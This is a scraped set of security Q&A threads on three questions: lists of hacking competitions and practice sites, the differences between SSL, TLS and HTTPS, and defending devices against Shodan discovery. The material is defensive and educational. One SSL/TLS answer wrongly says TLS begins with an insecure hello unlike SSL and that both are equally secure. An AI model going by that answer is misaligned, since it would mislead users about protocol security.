In the following I will allow myself to differentiate between various styles of hacking competitions. I don't know if this is a canonical approach, but it will probably help explaining the differences between the ones I know:

Wargames

These games take place on given server, where you start with an ssh login and try to exploit setuid-binaries to gain higher permissions. These games are usually available 24/7 and you can join whenever you want.


Over The Wire
Smash The Stack
Intruded


Challenge based competitions

These games will present you numerous tasks that you can solve separately. The challenges mostly vary from exploitation, CrackMes, crypto, forensic, web security and more. These games are usually limited to a few days and the team with the most tasks solved is announced the winner.
I will list my favorite, since I am quite convinced that you will easily find more of them. Some of the listed have just taken place and others will take place in the following months.


Defcon Quals
Codegate Quals 
CSAW CTF (usually during summer)
Hack.lu CTF 2011 (end of September this year) and Hack.lu CTF 2010
PlaidCTF


Capture The Flag

These actually require you to capture and protect "flags". The best known is probably iCTF, which underwent some rule changes within the last years. This game is also limited to a certain time frame. Contestants are typically equipped with a Virtual Machine that they are to connect to a VPN. Your task is to analyze the presented machine, find security bugs, patch them and exploit the bugs on other machines in your VPN. The "flags" are stored and retrieved by a central game-server that checks a team's availability and whether previously stored flags have not been stolen.


iCTF (typically in December)
CIPHER CTF (will be renewed by new organizers this year)
RuCTF and RuCTFe (a Russian CTF and its international version)


Other

There are also a bunch of downloadable virtual machines available to play offline, which is some kind of mix between 3) and 2) I suppose.


Damn Vulnerable Web Application 
Damn Vulnerable Linux 
Google Jarlsberg


Edit:

Tag

I have just come across a fifth game-type that I have not seen anywhere else. All teams compete with each other during several rounds and each round is a match between two teams. Phase 1: Both teams get root on a Linux System and try to hide as many back-doors within 15 minutes as possible. After these 15 minutes, the teams swap PCs and try to discover and remove as many back-doors as possible (also with root access). In the third phase, each team gets its server back (without root access) and is supposed to exploit as many back-doors to gain root access again.  Remotely exploitable back-doors get bonus points :)

It appears that games like this has been carried out during the LinuxTag Linux Conventions in Germany in the last years.

The scenario is explained more detailed here (German only!)

/Edit

I hope this post has not become too confusing due to its length ;)

Unordered list of lists of Hacking competitions:


http://capture.thefl.ag/practice-ctf/, Calendar
http://www.wechall.net/sites.php
http://exploit-exercises.com/
http://www.stumbleupon.com/su/1YNSxi/www.brighthub.com/internet/security-privacy/articles/77093.aspx/
AnswerKenntnis:
I've been really enjoying: http://exploit-exercises.com/

From their site:


Nebula - Nebula covers a variety of simple and intermediate challenges that cover Linux privilege escalation, common scripting language issues, and file system race conditions.
Protostar - Protostar introduces basic memory corruption issues such as buffer overflows, format strings and heap exploitation under "old-style" Linux system that does not have any form of modern exploit mitigiation systems enabled.
Fusion - Fusion continues the memory corruption, format strings and heap exploitation but this time focusing on more advanced scenarios and modern protection systems.
AnswerKenntnis:
You can search for "war games" keyword if you want "puzzles" such as those at OverTheWire.org.

Here's a list of some other challenge sites:


http://www.wechall.net/sites.php


Unfortunately, I don't know of other high-profile competitions than those you've already mentioned.

By the way, I think this question would fit a community wiki status.
AnswerKenntnis:
iCTF:  http://ictf.cs.ucsb.edu/
DC3 (going on right now):  http://www.dc3.mil/challenge/
NetWars SANS: http://www.sans.org/netwars/

There are also a lot of security CTF competitions at big conferences like Shmoocon, DEFCON, etc.  I would recommend going to some cons for more info.  

It really depends what end goal you want, either CTF, forensics, live response, etc.
AnswerKenntnis:
Capture.thefl.ag has excellent resources,  
Live CTF Calendar  
List of online practice CTFs/Games and write ups by winners of previous CTFs.


It can't be more awesome than that.
AnswerKenntnis:
This is not a shameless plug because I am not involved with this podcast at all but listen to the isdpodcast from this past week with Ed Skoudis. Don't remember the exact date but think it was Tuesday or Wednesday. Ed talks a lot about various challenges and CTF stuff.
AnswerKenntnis:
I have created a wiki detailing lots of different competitions, with descriptions, and links to write-ups and some resources for Beginners. See it there: http://ctf.forgottensec.com
AnswerKenntnis:
http://ctftime.org/ is a good site to know about the upcoming capture the flag events, also it has a ranking and write-ups that are great.
AnswerKenntnis:
There is also the Spider Challenge from Spider.io (Web hacking).

The goal:


  WeΓÇÖve hidden fourteen codes in and around challenge.spider.io. With each code that you find, weΓÇÖll give you a clue to help you find the next code. As soon as you sign in to the challenge, the clock starts ticking. ItΓÇÖs a race against time. ItΓÇÖs a race against other hackers. Best of luck!


You need twitter account to participate.
AnswerKenntnis:
I was on StumbleUpon and found this list of hacking games / challenges - I thought some of you might find them interesting.
AnswerKenntnis:
Ed Skoudis has nice collection of penetration testing/forensics challenges here:
http://www.counterhack.net/Counter_Hack/Challenges.html
AnswerKenntnis:
Hack in the Box (HITB) Capture The Flag
http://conference.hitb.org/hitbsecconf2012kul/event/capture-the-flag/

An annual hacking competition during HITBSecConf
AnswerKenntnis:
Enigmagroup has some interesting hacking challenges ...
Some reversing [elf binary challenges as well as windows reversing], captcha cracking, realistic challenges, stenography, cryptography, and other usual things like xss, javascript, and so on.
AnswerKenntnis:
This is a recent hacking competition and still running: www.hackimind.com 

About the competition:


  A file (published on Nov 30th 2012) has been encoded and the decoding
  key will be made public on March 17th 2013 ΓÇô end date for the
  competition.
  
  Your challenge is to decode the file without its key.
  
  In order to claim the prize, submit the decrypted file into the
  Innovation Exchange platform.
  
  During the course of the competition this site will be used to share
  hints with all participants.
AnswerKenntnis:
0x41414141.com is a good one...when you finish you are asked for your resume.
QuestionKenntnis:
What's the difference between SSL, TLS, and HTTPS?
qn_description:
I get confused with the terms in this area. What is SSL, TLS, and HTTPS? What are the differences between them?
AnswersKenntnis
AnswerKenntnis:
TLS is the new name for SSL. Namely, SSL protocol got to version 3.0; TLS 1.0 is "SSL 3.1". TLS versions currently defined include TLS 1.1 and 1.2. Each new version adds a few features and modifies some internal details. We sometimes say "SSL/TLS".

HTTPS is HTTP-within-SSL/TLS. SSL (TLS) establishes a secured bidirectional tunnel for arbitrary binary data between two hosts. HTTP is a protocol for sending requests and receiving answers, each request and answer consisting in detailed headers and (possibly) some content. HTTP is meant to run over a bidirectional tunnel for arbitrary binary data; when that tunnel is a SSL/TLS connection, then the whole is called "HTTPS".


SSL= Secure Sockets Layer
TLS = Transport Layer Security
HTTPS = HyperText Transfer Protocol Secured
AnswerKenntnis:
SSL and TLS are protocols that aim to provide privacy and data integrity between two parties (see RFC 2246), designed to run over a reliable communication protocol (typically TCP). Although the TLS specification doesn't talk about sockets, the design of SSL/TLS was done so that applications could use them almost like traditional TCP sockets, for example SSLSocket in Java extends Socket (there are small differences in terms of usability, though).

HTTPS is HTTP over SSL/TLS, where the SSL/TLS connection is established first, and then normal HTTP data is exchanged over this SSL/TLS connection.
Whether you use SSL or TLS for this depends on the configuration of your browser and of the server (there usually is an option to allow SSLv2, SSLv3 or TLS 1.x).
The details of how HTTP and SSL/TLS form HTTPS are in RFC 2818.

Regarding the difference between SSL and TLS, you may be interested in these two answers I wrote for these similar questions on StackOverflow and ServerFault:


Difference between SSL & TLS [Stackoverflow]
What are the exact protocol level differences between SSL and TLS? [Serverfault]



  You could consider TLSv1.0 as SSLv3.1 (in fact that's what happens
  within the records exchanged). It's just easier to compare the TLSv1.0
  with TLSv1.1 and TLSv1.2 because they've all been edited within IETF
  and follow more or less the same structure. SSLv3 being edited by a
  different institution (Netscape), it makes it a bit more difficult so
  spot the differences.
  
  Here are a few differences, but I doubt I can list them all:
  
  
  In the ClientHello message (first message sent by the client, to initiate the handshake), the version is {3,0} for SSLv3, {3,1} for
  TLSv1.0 and {3,2} for TLSv1.1.
  The ClientKeyExchange differs.
  The MAC/HMAC differs (TLS uses HMAC whereas SSL uses an earlier version of HMAC).
  The key derivation differs.
  The client can send application data can be sent straight after sending the SSL/TLS Finished message in SSLv3. In TLSv1, it must wait
  for the server's Finished message.
  The list of cipher suites differ (and some of them have been renamed from SSL_* to TLS_*, keeping the same id number).
  There are also differences regarding the new re-negotiation extension.
  


Generally, the higher the version or SSL/TLS, the more secure it is, provided you choose your cipher suites properly too (higher versions of TLS also offer using cipher suites that are considered better). (SSLv2 is considered insecure.) In addition, SSL doesn't fall under the IETF scope. For example, the TLS renegotiation fix had to be retrofitted for SSLv3 (although SSL/TLS stacks had to be updated anyway).

You may also be interested in this answer:


What happens on the wire when a TLS / LDAP or TLS / HTTP connection is set up?[Stackoverflow]


Note that some people oppose SSL and TLS as being the difference between "SSL/TLS upon connection" and "upgrade to TLS" (after some conversation using the application protocol). Despite some of these answers being relatively highly upvoted, this is incorrect. This mistake is propagated by the fact that certain applications, like Microsoft Outlook, offer two configuration options called "SSL" and "TLS" for SMTP/IMAP configuration when they really mean "SSL/TLS upon connection" and "upgrade to TLS". (The same goes for the JavaMail library, I think.)

The RFCs that talk about STARTTLS were written when TLS was already an official RFC, that's why they only talk about upgrading the connection to TLS. In practice, if you tweak the configuration of your mail client to force it to use SSLv3 over TLS (not something I would generally recommend), it's still likely to be able to upgrade to SSL/TLS using STARTTLS with an SSLv3 connection, simply because it's more about the mode of operation than the version of SSL/TLS and/or the cipher suites.

There is also a variant of HTTP where the upgrade to SSL/TLS is done within the HTTP protocol (similar to STARTTLS in LDAP/SMTP). This is described in RFC 2817. As far as I know, this is almost never used (and it's not what's used by https:// in browsers). The main relevant part of this RFC is the section about CONNECT for HTTP proxy servers (this is used by HTTP proxy servers to relay HTTPS connections).
AnswerKenntnis:
SSL VS TLS

The terms SSL and TLS are often used interchangeably or in conjunction with each other (TLS/SSL), but one is in fact the predecessor of the other ΓÇö SSL 3.0 served as the basis for TLS 1.0 which, as a result, is sometimes referred to as SSL 3.1.

Which is more Secure SSL or TLS

In terms of security they both are consider equally secured

The main difference is that, while SSL connections begin with security and proceed directly to secured communications, TLS connections first begin with an insecure ΓÇ£helloΓÇ¥ to the server and only switch to secured communications after the handshake between the client and the server is successful. If the TLS handshake fails for any reason, the connection is never created.

(SSL and TLS vs HTTP)

HTTP protocol is used to request and recive the data and https in which the 's' is nothing but secure SSL which makes the http protocol request and receive activity encrypted so no middle man attacker can obtain the data easily.

If neither SSL nor TLS is used with HTTP

then your connection with the web server is unencrypted all the data will be sent in plaintext any middle man attacker can obtain and view that data.

so should go with SSL or TLS

well, both are same but TLS is more extensible and hoping to get more support in future
and TLS is backward compatible.
QuestionKenntnis:
How can I protect my internet-connected devices from discovery by Shodan?
qn_description:
There's been a lot of buzz around this recent CNN article about Shodan, a search engine that can find and allow access to unsecured internet-connected devices. 


  Shodan runs 24/7 and collects information on about 500 million connected devices and services each month.
  
  It's stunning what can be found with a simple search on Shodan. Countless traffic lights, security cameras, home automation devices and heating systems are connected to the Internet and easy to spot.
  
  Shodan searchers have found control systems for a water park, a gas station, a hotel wine cooler and a crematorium. Cybersecurity researchers have even located command and control systems for nuclear power plants and a particle-accelerating cyclotron by using Shodan.
  
  What's really noteworthy about Shodan's ability to find all of this -- and what makes Shodan so scary -- is that very few of those devices have any kind of security built into them. [...]
  
  A quick search for "default password" reveals countless printers, servers and system control devices that use "admin" as their user name and "1234" as their password. Many more connected systems require no credentials at all -- all you need is a Web browser to connect to them.


It sounds to me like some of these devices have been secured ostensibly but aren't actually secure because the passwords, etc., are obvious and/or unchanged from default settings.

How can I (either as a "normal" person or a professional) take steps to prevent my devices from being accessible by crawlers like Shodan? Are there other ways to mitigate my risk of discovery by something like Shodan?
AnswersKenntnis
AnswerKenntnis:
Shodan references publicly available machines which work like this:



Just don't do it.

Edit: analogy is relevant ! Shodan connects to machines and asks for their "banner", a publicly available text which may simply say: "to enter, use this default password: 1234". You might want to avoid people knocking at the door by the simple expedient of installing a giant squid as a guard before the door (metaphorically, a firewall), but, really, it would be much safer to configure a non-default password.
AnswerKenntnis:
The Shodan project is pretty cool, but at its core isn't much more than a big honkin nmap database. The project has scanners that routinely scan the Internet and publish the findings into the database. That database is what you're searching. Since they are using standard detection routines the protections you would put in for a normal scan should protect you here.


Configure your firewalls appropriately. -- This means for any services you provide, restrict them as much as you can. If you only have 5 people from marketing using your web application, then there's no need for the entire world to use it. Figure out which address space marketing uses and open it up only to them. (You may also want to allow remote access solutions, but that's up to you).
Clean up your banners. -- Many banners, by default, give gobs of information. For instance, by default Apache httpd will tell you what version it is, what OS it's running on, what modules it has enabled, etc. This is really pretty unnecessary. Apache httpd has configuration settings to give less information, but the specifics will depend on which service you're hosting.
Have your firewalls silently block. By default many firewalls will send out an ICMP Destination Administratively Prohibited when it drops packets. This will let the scanner know that something exists on that port, it's just not allowed to hit it. By turning on stealth, silent, or whatever mode the connections will just time out on the scanner's end. To them this will look like the host doesn't even exist.
AnswerKenntnis:
For most home users, the only internet-facing device is their router.

So, how do you secure the router from stuff like Shodan?


Firstly, change the default password. Anyone armed with an IP scanning tool (Angry IP Scanner is the one I've tried) can find you if they input the relevant IP range and break in with the bog standard admin/admin login. What can they do if they have this access?

They can get the password of your broadband connection (and in some cases start stealing your bandwidth)
They can set up port forwarding and get to your computers/devices.
They can change your DNS server and redirect your browsing to their malicious clones of websites. Unless the site uses SSL, you won't be able to know that this is happening. Note that SSL on the site may not be enough -- most people wouldn't notice if they were served http versions of their favorite https sites.
They can just mess up your router

Another thing to do is to disable remote management (example for Linksys routers). This hides the router's configuration pages to the outside world, so people can't get in even if they try brute forcing. (Additionally, you won't show up in an IP scan unless you have port forwarding). Note that there are some cases when you would want this option on -- I've kept it on for brief periods of time when testing stuff. But usually, there's no harm keeping it off.
Check your port forwarding rules. Even if you fix the above two, a forwarded port translates to a direct connection to your computer. In most cases, you shouldn't have any forwarded ports. If you're a gamer, you may have a few game-specific ports. (Usually the ports are chosen so as not to interfere with some other services) Make sure nothing forwards to ports 21,22,3389. If it does, make sure your ssh/ftp/remote desktop passwords are secure (or ssh/ftp/rdp is disabled). There are probably some other ports that provide an easy way to take over the machine, but I can't think of any OTOH.


On the computer, check your firewall. Make it as restrictive as possible without breaking things. 

Note that to stop Shodan specifically for a home system, you only need point 1 or 2. However, I've listed the rest as Shodan could easily improve itself to further analyze router connections.
AnswerKenntnis:
So the short answer is that if you're providing a publicly available service (e.g. to the general Internet) your service has to be accessible and therefore search engines like shodan can find it, and all shodan does it to index publicly available information.  

What you can do is minimize the information that shodan finds, by removing banners from accessible services and also ensuring things like default credentials are removed (standard security good practice).

Also if the service you have running doesn't need to be accessible by the whole Internet (i.e. only some people need to be able to access it), using firewalls to restrict which source IP addresses can reach the service is also an effective protection against discovery by things like Shodan.

One other theoretical protection (which I'd say is a bad approach but for completeness sake I'll mention) is that if you could find the IP address ranges that shodan uses, you could try and block it specifically. 

The risks that make shodan seem "scary" are that there are a huge number of systems which have been placed on the Internet with default settings and very little thought to security.  Unfortunately people who place systems on the Internet in this state are unlikely to be security aware enough to take actions like specifically blocking shodan...

One other thing to mention is that even blocking things like shodan wouldn't help you against things like the Internet Census project which happened last year.  This used a large number of compromised systems to scan the whole Internet.  The output of the project is available as a torrent and I'd be willing to bet that a lot of researchers and attackers are currently looking through the data for things to attack (which they'll likely find)
AnswerKenntnis:
a search engine that can find and allow access to unsecured internet-connected devices.


The real question with Shodan is why these devices are internet-facing in the first place. This does not excuse the need to change the default configuration information, but leaving your printer world-accessible is just plain silly.

There is a security measure you can use against this kind of thing - VPN for remote workers, and a firewall. It's a corporate asset, so require users to actually connect to the corporate network with all of the restrictions that implies. Not doing so means you have no idea who is logging in to a device on your network. Put the device behind a firewall and have users log in.

Then, onto failing number two - this is reasonably obvious - change those defaults. Most organisations have some kind of management policy for assets and that should include managing login credentials to them especially if they're going to be on the network. The device should be configured securely.

If it isn't possible to configure the device securely because of some bug introduced by the manufacturer, then the engine is doing us a favour by exposing it - this will put pressure on these companies to fix their issues.

Finally, you can (and in my opinion should) hide information from servers e.g. Apache version strings. This will not excuse or replace a proper security configuration and diligently updated software, but there is no reason to tell the attacker everything about your system either.
AnswerKenntnis:
If you have some services that you want to expose to yourself on a public IP but want to hide them from the rest of the world, you could use port knocking to hide the devices from general port scans while still making them accessible without a VPN connection to someone that knows how to knock. I have several home webcams that I occasionally want to be able to access from work, but the firewall at work won't let me initiate a VPN to my home firewall.

So, I "knock" 3 ports on my home firewall and it allows connections from the knocking IP to the cameras.

Port knocking is pretty weak security from someone determined to crack into your network since the knocks are easily sniffed (the knocks are effectively a password sent in plain text), but brute forcing the ports is nearly impossible even if an attacker knew port knocking was in use - 3 random ports give around 48 bits worth of password entropy, so it's pretty safe from a random  hacker. A VPN would be more secure since it encrypts everything.

Also, since it works at the IP level, once I unlock the ports from my work IP address, everyone at work can access them since they all share the same IP address. (they are outside cameras in a DMZ that I usually  use to check on the dog, so I'm not too worried about someone at work seeing them, but I don't really want the whole world to see them)

There's a lot more information on the pros/cons of portknocking here:


Port Knocking - is it a good idea? [Stackexchange]




A commenter noted that 48 bits of entropy is not a lot, which is true with something like a password where if the attacker can obtain the hash, he can execute an offline attack and test millions or trillions of combinations a second. However, since any port knocking brute force attack is limited by network latency and bandwidth constraints, 48 bits is still quite a lot of entropy. To successfully brute force a password, on average you'd need to make N/2 guesses where in this case N = 2^48 so N/2 = 2^47

Each guess means sending down 3 syn packets to knock on the 3 ports, so assuming 60 bytes for a SYN packet, you'd need to send 2^47 * 3 * 60 = 2.5 x 10^16 bytes or 22 petabytes. 

Using my 15mbit home internet connection, it would take 510 years to send that much data.

And that ignores the network latency, if you could send the knock and immediately test your knock with 1 msec of latency (typical real world ping latency from my home network to the first hop out of my ISP's network is 13msec), it would take 2^47 msec, or 4,000 years to brute force it.

And of course, this all assumes that you could make unlimited guesses before the port knock daemon ignores you or before I noticed that something was consuming all of my inbound bandwidth (my ISP would certainly notice and would throttle me)

And it also ignores that knowing if you had a successful knock adds entropy on its own if you don't know which port to check - my cameras listen on some non-obvious ports, so that ads another 16 bits or so of entropy.

So, as I said, port knocking is weak security since it's so easily sniffed, but it's not easily brute forced.
AnswerKenntnis:
Simply ensure that your devices are secure and don't advertise their presence if they don't need to.  You can use services likes Gibson research's ShieldsUp to easily check if you have ports on your network connection that are responding to services from the public internet.

If you have anything showing that doesn't need to be, disable the service and block the port on your router.  If you do need the service, ensure that it is properly secured so that it can not be easily abused.  There isn't much that can be done about the fact that publicly facing services that need to respond to requests will be discoverable by port scans.  Trying to avoid that is kind of akin to trying to avoid someone knowing where your store is when they can simply drive down the street and look at the sign.

You can try to take down the sign (remove banners, change default ports, etc) to try and make it harder for someone to recognize what the store does (what the service is), but you can't really hide the fact there is a building on the lot (a service on the port).
AnswerKenntnis:
The best defence that could ever be offered to protect against shodan scans are the same as with any other scans.


Properly configure your software, HIPS, and firewall
Build your servers to run within containers in mind (ie bsd jails/linux containers/windows sandboxie).
Ensure there are no vulnerable versions of software running on the server
Rate limit abusive connections (ie non-human initiated connections that spike in a small window)
Eliminate any server banners being offered by your software
Finally, Null Route all abusive IP addresses. Namely those from shodan and others listed on RBLs.


The obvious answer is the first one, up to date security suite and well configured  software running with the latest security patches. While this the common norm these days it is no differently than just throwing your system out to the wolfs with a torch. All security (throughout history in the real world and virtual world) is built on layers.

If you build your system to run in a sandbox like environment then if anything goes wrong you can rollback to a working version prior to the issue and analyse what went wrong from there. This also has the added benefit of being an agile server in where if a bug is introduced for any reason, malicious or not, then you can just push back to a working version in moments and not have down time.

Simply rate limiting and eliminating banners and any other identifying traits  makes it harder to enumerate the servers or gather intel which is step one in penitration.

Lastly, the null routing and use of RBLs helps wall off well known abusive IP addresses such as know malware/botnet nodes, abusive/malicious users, and Hacking-as-a-Service sites such as shodan.

If you keep to these rules then the internet is not a scary place anymore as you've already defeated the "barbarians" before they even set sites on your server.
